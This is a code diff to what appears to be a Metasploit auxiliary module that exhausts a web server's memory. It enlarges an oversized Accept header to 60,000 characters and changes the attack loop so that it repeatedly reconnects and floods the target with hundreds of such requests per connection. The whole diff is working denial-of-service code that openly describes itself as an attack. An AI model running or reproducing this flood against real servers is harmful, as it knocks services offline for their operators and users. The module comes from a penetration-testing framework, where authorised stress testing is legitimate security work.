@@ -40,7 +40,8 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(80),
-        OptInt.new('MAXSTRINGSIZE', [true, 'Max string size', 20000]),
+        OptInt.new('MAXSTRINGSIZE', [true, 'Max string size', 60000]),
+        OptInt.new('REQ_COUNT',     [true, 'Number of HTTP requests for each iteration', 500]),
         OptInt.new('RLIMIT',        [true,  "Number of requests to send", 100000])
       ],
     self.class)
@@ -58,9 +59,9 @@ class Metasploit3 < Msf::Auxiliary
 
   def http_request
     http = ''
-    http << "GET / HTTP/1.1\r\n"
+    http << "GET /blah HTTP/1.1\r\n"
     http << "Host: #{host}\r\n"
-    http << "Content-Type: application/#{long_string}\r\n"
+    http << "Accept: #{long_string}\r\n"
     http << "\r\n"
 
     http
@@ -69,9 +70,13 @@ class Metasploit3 < Msf::Auxiliary
   def run
     payload = http_request
     begin
-      print_status("Stressing the target memory, this will take a lot of time...")
-      connect
-      datastore['RLIMIT'].times { sock.put(payload) }
+      print_status("Stressing the target memory, this will take a very long time...")
+      datastore['RLIMIT'].times { |i|
+        connect
+        datastore['REQ_COUNT'].times { sock.put(payload) }
+        disconnect
+      }
+
       print_status("Attack finished. If you read it, it wasn't enough to trigger an Out Of Memory condition.")
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
       print_status("Unable to connect to #{host}.")
